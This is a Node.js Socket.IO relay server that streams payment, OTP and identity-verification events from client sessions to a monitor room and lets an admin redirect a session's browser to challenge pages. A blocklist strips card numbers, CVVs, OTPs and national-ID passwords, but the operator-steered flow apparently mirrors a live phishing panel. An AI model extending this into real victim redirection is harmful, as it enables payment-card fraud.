import { createServer } from "node:http";
import { Server } from "socket.io";

const PORT = Number(process.env.PORT ?? 4000);
const CORS_ORIGINS = (process.env.CORS_ORIGIN ?? "http://localhost:5173")
  .split(",")
  .map((origin) => origin.trim())
  .filter(Boolean);
const MONITOR_ROOM = "monitors";
const SAFE_EVENT_TYPES = new Set([
  "session_joined",
  "session_left",
  "session_bound",
  "quote_submitted",
  "payment_method_submitted",
  "payment_challenge_submitted",
  "phone_challenge_submitted",
  "identity_verification_started",
  "identity_challenge_submitted",
  "contact_method_selected",
  "page_viewed",
  "client_state_changed",
]);
const SAFE_STATES = new Set([
  "submitted",
  "tokenization_required",
  "tokenized",
  "pending_provider_verification",
  "verified",
  "failed",
  "observed",
]);
const SAFE_KEYS = new Set([
  "sessionId",
  "eventType",
  "state",
  "referenceId",
  "cardBrand",
  "cardLast4",
  "pagePath",
  "provider",
]);
const SAFE_REDIRECT_PATHS = new Set([
  "/",
  "/reg",
  "/activate",
  "/activate_shamel",
  "/confirm",
  "/phone",
]);
const PROHIBITED_KEY =
  /(?:card.?number|card_number|\bpan\b|cvv|cvc|otp|passcode|password|\bpin\b|navazuser|navazpassword|identity_otp|card_otp)/i;
const PAN_LIKE_VALUE = /(?:^|\D)\d{13,19}(?:\D|$)/;

const httpServer = createServer((request, response) => {
  if (request.url === "/health") {
    response.writeHead(200, { "content-type": "application/json" });
    response.end(JSON.stringify({ ok: true, uptime: process.uptime(), transit: "marker-only" }));
    return;
  }
  response.writeHead(404);
  response.end();
});

const io = new Server(httpServer, {
  cors: { origin: CORS_ORIGINS, methods: ["GET", "POST"] },
  pingInterval: 25_000,
  pingTimeout: 60_000,
  maxHttpBufferSize: 16_384,
});

io.on("connection", (socket) => {
  const handshakeSessionId = normalizeSessionId(socket.handshake.auth?.sessionId);
  if (handshakeSessionId) socket.join(`session:${handshakeSessionId}`);
  console.log(`[io] connect ${socket.id} session=${handshakeSessionId ?? "n/a"}`);

  socket.on("monitor:join", () => {
    socket.join(MONITOR_ROOM);
    socket.emit("monitor:joined", { ok: true, transit: "marker-only" });
  });

  socket.on("monitor:leave", () => socket.leave(MONITOR_ROOM));

  socket.on("session:join", (payload) => {
    const sessionId = normalizeSessionId(payload?.sessionId);
    if (!sessionId) return reject(socket, "invalid_session_id");
    socket.join(`session:${sessionId}`);
    relaySafeEvent(socket, { sessionId, eventType: "session_joined", state: "observed" });
  });

  socket.on("session:leave", (payload) => {
    const sessionId = normalizeSessionId(payload?.sessionId);
    if (!sessionId) return reject(socket, "invalid_session_id");
    socket.leave(`session:${sessionId}`);
    relaySafeEvent(socket, { sessionId, eventType: "session_left", state: "observed" });
  });

  socket.on("session:state_changed", (payload) => relaySafeEvent(socket, payload));

  socket.on("admin:navigate", (payload) => {
    const sessionId = normalizeSessionId(payload?.sessionId);
    const path = typeof payload?.path === "string" ? payload.path : "";
    if (!sessionId || !SAFE_REDIRECT_PATHS.has(path)) return reject(socket, "invalid_navigation");
    io.to(`session:${sessionId}`).emit("admin:navigate", { path });
  });

  socket.on("disconnect", (reason) => {
    console.log(`[io] disconnect ${socket.id} reason=${reason}`);
  });
});

function relaySafeEvent(socket, payload) {
  const marker = validateSafeEvent(payload);
  if (!marker) return reject(socket, "unsafe_payload");
  console.log(
    `[io] state session=${marker.sessionId} event=${marker.eventType} state=${marker.state}`,
  );
  io.to(MONITOR_ROOM).emit("session:state_changed", marker);
}

function validateSafeEvent(payload) {
  if (!payload || typeof payload !== "object" || Array.isArray(payload)) return null;
  if (containsProhibitedKey(payload)) return null;
  if (Object.keys(payload).some((key) => !SAFE_KEYS.has(key))) return null;
  if (containsPanLikeValue(payload)) return null;

  const sessionId = normalizeSessionId(payload.sessionId);
  const eventType = typeof payload.eventType === "string" ? payload.eventType : "";
  const state = typeof payload.state === "string" ? payload.state : "";
  if (!sessionId || !SAFE_EVENT_TYPES.has(eventType) || !SAFE_STATES.has(state)) return null;

  const marker = { sessionId, eventType, state };
  if (payload.referenceId !== undefined) {
    const referenceId = String(payload.referenceId);
    if (!/^[A-Za-z0-9._:-]{1,160}$/.test(referenceId)) return null;
    marker.referenceId = referenceId;
  }
  if (payload.cardBrand !== undefined) {
    const cardBrand = String(payload.cardBrand).toLowerCase();
    if (!["visa", "mastercard", "mada", "amex", "unknown"].includes(cardBrand)) return null;
    marker.cardBrand = cardBrand;
  }
  if (payload.cardLast4 !== undefined) {
    const cardLast4 = String(payload.cardLast4);
    if (!/^\d{4}$/.test(cardLast4)) return null;
    marker.cardLast4 = cardLast4;
  }
  if (payload.pagePath !== undefined) {
    const pagePath = String(payload.pagePath).split("?")[0];
    if (!/^\/[A-Za-z0-9/_-]{0,119}$/.test(pagePath)) return null;
    marker.pagePath = pagePath;
  }
  if (payload.provider !== undefined) {
    const provider = String(payload.provider).trim();
    if (!provider || provider.length > 80) return null;
    marker.provider = provider;
  }
  return marker;
}

function normalizeSessionId(value) {
  if (typeof value !== "string") return null;
  const sessionId = value.trim();
  return /^[A-Za-z0-9_-]{1,128}$/.test(sessionId) ? sessionId : null;
}

function containsProhibitedKey(value) {
  if (Array.isArray(value)) return value.some(containsProhibitedKey);
  if (!value || typeof value !== "object") return false;
  return Object.entries(value).some(
    ([key, nested]) => PROHIBITED_KEY.test(key) || containsProhibitedKey(nested),
  );
}

function containsPanLikeValue(value) {
  if (typeof value === "string") return PAN_LIKE_VALUE.test(value.replace(/[\s-]/g, ""));
  if (Array.isArray(value)) return value.some(containsPanLikeValue);
  if (!value || typeof value !== "object") return false;
  return Object.values(value).some(containsPanLikeValue);
}

function reject(socket, reason) {
  socket.emit("safe:rejected", { reason });
}

httpServer.listen(PORT, () => {
  console.log(`Socket.IO marker relay listening on :${PORT} (CORS: ${CORS_ORIGINS.join(", ")})`);
});
